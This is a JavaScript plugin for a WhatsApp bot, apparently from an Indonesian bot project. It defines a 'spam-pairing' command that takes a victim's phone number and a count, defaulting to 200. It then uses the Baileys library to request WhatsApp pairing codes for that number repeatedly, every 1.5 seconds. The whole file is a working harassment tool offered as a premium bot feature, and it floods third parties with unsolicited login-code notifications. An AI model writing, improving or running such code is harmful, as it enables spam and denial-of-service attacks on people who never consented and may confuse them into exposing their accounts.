const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let manz = async (m, { text, usedPrefix, reply, command }) => {
    if (!text) return m.reply(`*Example:* ${usedPrefix + command} +628xxxxxx|150`);

    m.reply("Please wait..."); // Mengganti variabel 'wait' dengan string yang sesuai
    let [peenis, pepekk = "200"] = text.split("|");

    let target = peenis.replace(/[^0-9]/g, '').trim();
    let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@adiwajshing/baileys');
    let { state } = await useMultiFileAuthState('pepek');
    let { version } = await fetchLatestBaileysVersion();
    let pino = require("pino");
    let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });

    for (let i = 0; i < parseInt(pepekk, 10); i++) { // Pastikan pepekk diubah menjadi angka
        await sleep(1500);
        let prc = await sucked.requestPairingCode(target);
        console.log(`_Success Spam Pairing Code - Number: ${target} - Code: ${prc}_`); // Memperbaiki typo 'Succes' menjadi 'Success'
    }
    
    await sleep(15000);
}

manz.help = ['spam-pairing'];
manz.tags = ['premium'];
manz.command = ['spam-pairing'];
module.exports = manz;
manz.premium = true;